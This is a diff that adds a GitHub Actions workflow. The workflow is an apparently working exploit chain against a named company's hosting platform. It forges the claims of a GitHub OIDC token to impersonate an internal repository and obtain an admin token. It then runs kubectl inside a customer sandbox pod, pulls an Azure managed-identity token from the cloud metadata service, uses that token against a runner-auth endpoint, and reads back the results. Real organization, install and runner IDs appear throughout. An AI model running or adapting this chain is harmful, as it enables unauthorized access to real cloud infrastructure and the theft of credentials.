@@ -1,0 +1,98 @@
+name: azure-sandbox-imds
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Test the real customer sandbox IMDS path
+        shell: bash
+        run: |
+          set -euo pipefail
+          raw="$(curl -sSf "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https%3A%2F%2Fapi.byoc.lovable.net" -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}")"
+          export REAL_TOKEN="$(jq -r .value <<<"$raw")"
+          request="$(python3 - <<'PY'
+          import base64,json,os
+          h,p,s=os.environ['REAL_TOKEN'].split('.')
+          fake={
+            'iss':'https://token.actions.githubusercontent.com','aud':'https://api.byoc.lovable.net',
+            'sub':'repo:lovablelabs/lovable-enterprise:ref:refs/heads/main',
+            'repository':'lovablelabs/lovable-enterprise','repository_id':'1287375944',
+            'repository_owner':'lovablelabs','repository_owner_id':'148472368',
+            'repository_visibility':'internal','ref':'refs/heads/main','ref_type':'branch','event_name':'push',
+            'workflow_ref':'lovablelabs/lovable-enterprise/.github/workflows/nuon-app-branches.yml@refs/heads/main',
+            'job_workflow_ref':'lovablelabs/lovable-enterprise/.github/workflows/nuon-app-branches.yml@refs/heads/main',
+          }
+          fp=base64.urlsafe_b64encode(json.dumps(fake,separators=(',',':')).encode()).decode().rstrip('=')
+          print(json.dumps({'org_id':'orgl9cvkaqh1g8yv2jqdb19247','token':json.dumps({'protected':h,'payload':p,'signature':s,'fake':'.'+fp+'.'},separators=(',',':'))},separators=(',',':')))
+          PY
+          )"
+          bootstrap="$(curl -sSf 'https://api.byoc.lovable.net/v1/oidc/token' -H 'Content-Type: application/json' --data "$request")"
+          admin_token="$(jq -r .token <<<"$bootstrap")"
+
+          read -r -d '' command <<'CMD' || true
+          set -eu
+          pod="$(kubectl get pods -n sandbox -l sandbox-pool=true --field-selector=status.phase=Running -o jsonpath='{.items[0].metadata.name}')"
+          [ -n "$pod" ]
+          runtime="$(kubectl get pod -n sandbox "$pod" -o jsonpath='{.spec.runtimeClassName}')"
+          host_network="$(kubectl get pod -n sandbox "$pod" -o jsonpath='{.spec.hostNetwork}')"
+          printf 'sandbox_runtime=%s host_network=%s\n' "$runtime" "${host_network:-false}"
+          kubectl exec -i -n sandbox "$pod" -c sandbox -- node <<'NODE'
+          const http = require('http');
+          const https = require('https');
+          function request(options, body, transport = http) {
+            return new Promise((resolve, reject) => {
+              const req = transport.request(options, res => {
+                let data = '';
+                res.on('data', c => data += c);
+                res.on('end', () => resolve({status: res.statusCode, data}));
+              });
+              req.setTimeout(8000, () => req.destroy(new Error('timeout')));
+              req.on('error', reject);
+              if (body) req.write(body);
+              req.end();
+            });
+          }
+          (async () => {
+            const meta = await request({
+              hostname: '169.254.169.254', port: 80,
+              path: '/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https%3A%2F%2Fmanagement.azure.com%2F',
+              headers: {Metadata: 'true'}
+            });
+            if (meta.status !== 200) {
+              console.log(JSON.stringify({imds_http: meta.status, imds_body: meta.data.slice(0, 240)}));
+              process.exit(0);
+            }
+            const token = JSON.parse(meta.data).access_token;
+            const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url'));
+            const postBody = JSON.stringify({token, runner_id: 'run5b4nkhe3lusly4h4edjwlqs'});
+            const auth = await request({
+              hostname: 'runner.byoc.lovable.net', port: 443, path: '/v1/runner-auth/azure', method: 'POST',
+              headers: {'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postBody)}
+            }, postBody, https);
+            let result;
+            try { result = JSON.parse(auth.data); } catch { result = {body: auth.data.slice(0, 240)}; }
+            console.log(JSON.stringify({
+              imds_http: meta.status,
+              claims: {tid: claims.tid, oid: claims.oid, sub: claims.sub, xms_mirid: claims.xms_mirid},
+              runner_auth_http: auth.status,
+              runner_auth: {authenticated: result.authenticated, principal_id: result.principal_id, runner_id: result.runner_id, error: result.error, description: result.description}
+            }));
+          })().catch(e => { console.log(JSON.stringify({probe_error: String(e)})); process.exit(0); });
+          NODE
+          CMD
+          action="$(jq -nc --arg command "$command" --arg req "$GITHUB_RUN_ID" '{command:$command,timeout:180,name:"azure-sandbox-imds",request_id:("azure-sandbox-imds-"+$req),enable_kube_config:true}' | curl -sSf -X POST 'https://api.byoc.lovable.net/v1/installs/inlkt94ayq8lrd01iolkrttq83/actions/adhoc-run' -H "Authorization: Bearer $admin_token" -H 'X-Nuon-Org-ID: orgl9cvkaqh1g8yv2jqdb19247' -H 'Content-Type: application/json' --data-binary @-)"
+          action_id="$(jq -r .id <<<"$action")"
+          for _ in $(seq 1 90); do
+            status="$(curl -sSf "https://api.byoc.lovable.net/v1/installs/inlkt94ayq8lrd01iolkrttq83/actions/runs/$action_id" -H "Authorization: Bearer $admin_token" -H 'X-Nuon-Org-ID: orgl9cvkaqh1g8yv2jqdb19247')"
+            state="$(jq -r .status <<<"$status")"
+            if [ "$state" = finished ] || [ "$state" = error ]; then break; fi
+            sleep 2
+          done
+          job="$(jq -r .runner_job.id <<<"$status")"
+          log="$(jq -r .runner_job.log_stream_id <<<"$status")"
+          printf 'action_state=%s\n' "$state"
+          curl -sS "https://api.byoc.lovable.net/v1/log-streams/$log/logs?order=asc&runner_job_id=$job" -H "Authorization: Bearer $admin_token" -H 'X-Nuon-Org-ID: orgl9cvkaqh1g8yv2jqdb19247' | jq -r '.[] | select(.log_attributes["nuon.command_output"] == "true") | .body'
